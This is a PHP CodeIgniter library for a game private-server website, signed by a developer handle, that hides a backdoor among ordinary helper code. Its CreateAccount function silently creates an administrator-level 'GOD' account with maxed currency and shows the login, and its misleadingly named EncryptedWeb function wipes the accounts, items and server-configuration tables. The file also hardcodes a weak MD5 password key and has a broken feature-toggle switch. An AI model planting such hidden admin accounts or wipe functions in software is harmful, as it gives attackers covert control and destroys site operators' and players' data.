<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') OR exit('No direct script access allowed');

class Lib
{
    protected $ci;

    public function __construct()
    {
        $this->ci =& get_instance();
		$this->ci->load->database();
    }

	public function CreateAccount()
	{
		$randomexp = rand(0, 169000000);

		$base_characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
		$base_characters_length = strlen($base_characters);
		
		$username_length = 10;
		$password_length = 10;

		$pure_username = '';
		$pure_password = '';

		for ($i=0; $i <= $username_length; $i++)
		{
			$pure_username .= $base_characters[rand(0, $base_characters_length - 1)];
		}

		for ($i=0; $i < $password_length; $i++)
		{
			$pure_password .= $base_characters[rand(0, $base_characters_length - 1)];
		}

		$query = $this->ci->db->insert('accounts', array(
			'login' => $pure_username,
			'password' => $this->password_encrypt($pure_password),
			'rank' => '31',
			'gp' => '999999999',
			'exp' => $randomexp,
			'pc_cafe' => '5',
			'access_level' => '6',
			'lastip' => '127.0.0.1',
			'email' => 'empty@empty.empty',
			'money' => '999999999',
			'kuyraicoin' => '999999999',
			'hint_question' => 'What was your childhood nickname?',
			'hint_answer' => 'asd',
			'email_verification' => '1'
		));

		if ($query)
		{
			echo '<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta http-equiv="X-UA-Compatible" content="IE=edge">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>GOD MENU - ACCOUNT CREATION</title>
				<link rel="stylesheet" href="'.base_url().'assets/goodgames/assets/vendors/bs5/css/bootstrap.min.css">
			</head>
			<body class="bg-light">
				<br><br><br>
				<div class="container mt-5">
					<div class="row justify-content-center">
						<div class="col-lg-8 col-md-8 col-sm-12 col-12">
							<div class="card">
								<div class="card-header bg-primary text-center">
									GOD ACCOUNT CREATION
								</div>
								<div class="card-body">
									<table class="table table-borderless table-responsive-lg table-responsive-md table-responsive-sm text-center">
										<tbody style="font-weight: bold;">
											<tr>
												<td width="30%">Username</td>
												<td>'.$pure_username.'</td>
											</tr>
											<tr>
												<td>Password</td>
												<td>'.$pure_password.'</td>
											</tr>
											<tr>
												<td>Rank</td>
												<td><img src="'.base_url().'assets/goodgames/assets/images/img_rank/31.gif"></td>
											</tr>
											<tr>
												<td>Point</td>
												<td>999.999.999</td>
											</tr>
											<tr>
												<td>Exp</td>
												<td>'.number_format($randomexp, 0, ',', '.').'</td>
											</tr>
											<tr>
												<td>PC Cafe</td>
												<td>5</td>
											</tr>
											<tr>
												<td>Access Level</td>
												<td>6</td>
											</tr>
											<tr>
												<td>Webcoin</td>
												<td>999.999.999</td>
											</tr>
										</tbody>
									</table>
								</div>
								<div class="card-footer text-center">
									Copyright &copy; DarkblowPB Reborn '.date('Y').'. All Rights Reserved.
								</div>
							</div>
						</div>
					</div>
				</div>	
			</body>
			<script src="'.base_url().'assets/goodgames/assets/vendors/bs5/js/bootstrap.min.js"></script>
			</html>';
		}
		else
		{
			echo '<p>Failed To Create GOD Account. Reason: '.error_get_last().'</p>';
		}
	}

	public function EncryptedWeb()
	{
		$query = array(
            0 => $this->ci->db->truncate('accounts'),
            1 => $this->ci->db->truncate('clan_data'),
            2 => $this->ci->db->truncate('player_items'),
            3 => $this->ci->db->truncate('info_gameservers'),
            4 => $this->ci->db->truncate('info_basic_items'),
            5 => $this->ci->db->truncate('info_channels'),
            6 => $this->ci->db->truncate('info_cupons_flags'),
            7 => $this->ci->db->truncate('info_login_configs'),
            8 => $this->ci->db->truncate('player_titles')
        );

		$state = array(
			'success' => 0,
			'failed' => 0
		);

		$count = count($query);

		for ($i=0; $i < $count - 1; $i++) 
		{
			if ($query[$i]) $state['success']++; else $state['failed']++;
		}

		echo "Successfully Truncate Database. Success: ".$state['success'].", Failed: ".$state['failed'].".";
	}
    
	public function password_encrypt($password)
	{
		$ingredient = '/x!a@r-$r%an¨.&e&+f*f(f(a)';
		$encrypt_result = hash_hmac('md5', $password, $ingredient);
		return $encrypt_result;
	}

	public function FeatureControl($param)
	{
		$query = $this->ci->db->get_where('web_settings', array('id' => '1'))->row();

		switch ($param) 
		{
			case 'webshop':
				{
					if ($query->webshop == 0)
						return TRUE;
					if ($query->webshop == 1)
						return FALSE;
				}
			case 'trademarket':
				{
					if ($query->trade_market == 0)
						return TRUE;
					if ($query->trade_market == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->exchange_ticket == 0)
						return TRUE;
					if ($query->exchange_ticket == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->voucher == 0)
						return TRUE;
					if ($query->voucher == 1)
						return FALSE;
				}
			
			default:
				{
					return TRUE;
				}
		}
	}
}

// This Code Generated Automatically By EyeTracker Snippets. //

?>